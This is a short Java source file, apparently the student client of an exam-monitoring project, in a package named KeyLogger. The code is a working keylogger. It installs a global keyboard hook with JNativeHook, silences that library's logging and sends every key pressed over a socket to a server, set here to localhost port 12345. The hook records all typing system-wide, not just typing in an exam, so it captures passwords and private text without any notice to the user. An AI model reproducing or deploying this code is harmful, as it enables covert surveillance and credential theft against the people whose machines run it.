package com.client.liveowl.KeyLogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

public class StudentClient {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;

    public static void main(String[] args) {
        // Tắt logging của JNativeHook
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        try {
            // Kết nối tới server
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            OutputStream outputStream = socket.getOutputStream();
            PrintWriter writer = new PrintWriter(outputStream, true);

            // Đăng ký bộ lắng nghe sự kiện bàn phím
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e) {
                    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
                    writer.println(keyText); // Gửi phím bấm về server
                }

                @Override
                public void nativeKeyReleased(NativeKeyEvent e) {
                    // Không cần thiết xử lý
                }

                @Override
                public void nativeKeyTyped(NativeKeyEvent e) {
                    // Không cần thiết xử lý
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}





